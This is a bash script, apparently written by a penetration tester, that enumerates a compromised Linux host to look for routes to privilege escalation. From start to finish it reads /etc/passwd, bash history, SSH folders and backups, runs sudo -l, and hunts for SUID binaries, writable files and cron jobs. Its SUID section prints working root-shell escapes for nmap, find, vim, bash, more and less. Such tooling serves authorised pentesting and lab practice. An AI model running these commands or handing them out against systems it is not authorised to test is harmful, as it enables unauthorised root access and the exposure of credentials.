#!/bin/bash

#this is a short script to do initial linux enumeration. I found that running
#the standard linenum.sh or privchecker.py spit out way too much info
#for my eyes to handle, so this makes it easy to observe the basics -
#use it, or don't. i'm a wall of text, not a cop

echo ""
echo "----------------------------------------"
echo "| Linux Enumeration Script by @bngrsec |"
echo "----------------------------------------"
echo ""

#host information
echo "-----HOST INFORMATION-----"
name=$(hostname)
echo "Hostname is $name"
echo ""
uname -a
echo ""
cat /etc/issue
cat /proc/version
echo ""

#run a check to see what the arch is, then tell you what that actually is
#i usually find myself referring to my notes or googling the output, hopefully this works
echo "-----ARCH-----"
arch=$(uname -i)
echo "$name architecture is $arch."
if [[ $arch == *'x86_64'* ]];
then
  echo "[*] This is 64-bit."
else
  echo "[*] This is 32-bit. (unless arch is unknown)."

fi
echo ""

#current user information
echo "-----USER INFORMATION-----"
whoami
id
echo ""

echo "-----ENVIRONMENT-----"
env
checkpath=$(echo $PATH)
if [[ $checkpath == *'./'* ]];
then
  echo ""
  echo "[*] Dot in user's \$PATH. This can be used for privilege escalation."
fi
echo ""
 
#this might need a passwd
echo "-----SUDO PERMISSIONS-----"
echo "[!] If you don't have a password, just press enter a few times."
sudo -l
echo ""

#check for easy known OutOfBox account that usually has no password set
#which might be useful if you are currently on a very low-priv account
echo "-----USERS ON BOX-----"
ls -la /home/
echo ""
listpasswd=$(cat /etc/passwd)
cat /etc/passwd
if [[ $listpasswd == *'OutOfBox'* ]];
then
  echo ""
  echo "[*] OutOfBox account observed. OutOfBox usually has no password set."
fi
echo ""
w
echo ""

#find suid executables
#nmap, find, vim, bash, more, less, nano, cp
#yes, im doing this completely inefficiently. fight me
echo "-----SUID EXECUTABLES-----"
find /* -user root -perm -4000 -print 2>/dev/null
echo ""
echo "[==>] Searching for insta-SUID-wins:"
if find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nmap';
then
  echo "[*] NMAP has SUID permissions. Run 'nmap --interactive', then '!sh' for root shell."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'find';
then
  echo "[*] FIND has SUID permissions. Run 'find [file] -exec bash -p \;' for root shell."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'vim';
then
  echo "[*] VIM has SUID permissions. Run 'vim', then hit escape, type ':set shell=/bin/sh', ':shell' for root shell or edit sensitive files."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'bash';
then
  echo "[*] BASH has SUID permissions. Run 'bash -p' for root shell."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'more';
then
  echo "[*] MORE has SUID permissions. Run 'more /etc/passwd', '!/bin/sh' for root shell."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'less';
then
  echo "[*] LESS has SUID permissions. Run 'less /etc/passwd', '!/bin/sh' for root shell."
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'nano';
then
  echo "[*] NANO has SUID permissions. Visit https://gtfobins.github.io/gtfobins/nano/#suid"
elif find /* -user root -perm -4000 -print 2>/dev/null | grep -q 'cp';
then
  echo "[*] CP has SUID permissions. Visit https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/"
else
  echo "[!] No SUID insta-wins found. There is a chance I may have missed a few."
fi
echo ""

#might be helpful to run this without looking for root processes aswell
echo "-----RUNNING PROCESSES AS ROOT-----"
ps aux | grep root
echo ""

echo "-----NETWORK INFORMATION-----"
netstat -antup
echo ""
route
echo ""

#write applications to text file, because the output is usually huge
echo "-----INSTALLED APPLICATIONS-----"
dpkg -l > /tmp/packages.txt
echo "Applications written to text file at /tmp/packages.txt"
echo ""

#world writable directories
echo "-----WORLD WRITABLE DIRECTORIES-----"
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
echo ""

#world writable directories for root
echo "-----WORLD WRITABLE DIRECTORIES FOR ROOT-----"
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
echo ""

#world writable files
echo "-----WORLD WRITABLE FILES-----"
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
echo ""

#cronjob information
echo "-----CRON INFORMATION-----"
ls -la /etc/cron*
echo ""

#writable files in /etc/:
echo "-----WRITABLE FILES IN /ETC/-----"
find /etc -perm -2 -type f 2>/dev/null
echo ""

#permissions for passwd and shadow
echo "-----PASSWD/SHADOW PERMISSIONS-----"
ls -la /etc/ | grep passwd
ls -la /etc/ | grep shadow
echo ""

echo "[!] The following are stretches, but could be useful if found."
echo ""

#list configuration files in /etc/:
echo "-----CONFIGURATION FILES IN /ETC/-----"
ls -la /etc/ | grep .conf
echo ""

#list backups in /var/backups
echo "-----BACKUPS-----"
ls -la /var/backups/
echo ""

#current user bash history
echo "-----BASH HISTORY-----"
ls -la ~/.bash_history
echo ""
head -25 ~/.bash_history
echo ""
echo "[!] If there is something here, you need to check manually."

#ssh folders to check
echo "-----SSH INFO-----"
ls -la /etc/ssh
ls -la ~/.ssh/
echo ""

#if the machine is hosting a webpage, sometimes this is useful
echo "-----WEB FILES-----"
ls -la /var/www/html
echo ""

echo "-----UNMOUNTED FILE SYSTEMS-----"
cat /etc/fstab
echo ""
echo "[!] Check manually if the system has unmounted NFS shares. 'showmount -e [target IP]' from your Kali box. "
echo ""

